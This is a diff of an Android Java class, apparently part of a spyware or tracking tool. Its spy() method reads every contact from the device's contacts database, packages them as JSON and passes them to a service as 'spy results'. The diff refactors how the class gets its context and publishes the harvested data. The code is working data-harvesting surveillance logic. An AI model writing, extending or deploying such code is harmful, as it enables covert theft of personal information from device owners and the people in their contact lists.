@@ -9,16 +9,19 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 public class TrackerContacts extends TrackerMethod {
+
+
+    public TrackerContacts() {this("Contacts");}
+    public TrackerContacts(String name) {
+        super(name);
+    }
+
     @Override
     public void spy() {
-
-        TrackerManager that = TrackerManager.get();
-        if (that==null) return;
-
         JSONArray contacts = new JSONArray();
         JSONObject container = new JSONObject();
         try {
-            ContentResolver cr = that.getContentResolver();
+            ContentResolver cr = getContext().getContentResolver();
             Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
             if (cur != null && cur.moveToFirst()) {
                 do {
@@ -47,11 +50,6 @@ public class TrackerContacts extends TrackerMethod {
         } catch (JSONException e) {
             e.printStackTrace();
         }
-        that.publishSpyResults(this,container);
-    }
-
-    @Override
-    public String getName() {
-        return "Contacts";
+        TrackerService.publishSpyResults(this,container);
     }
 }
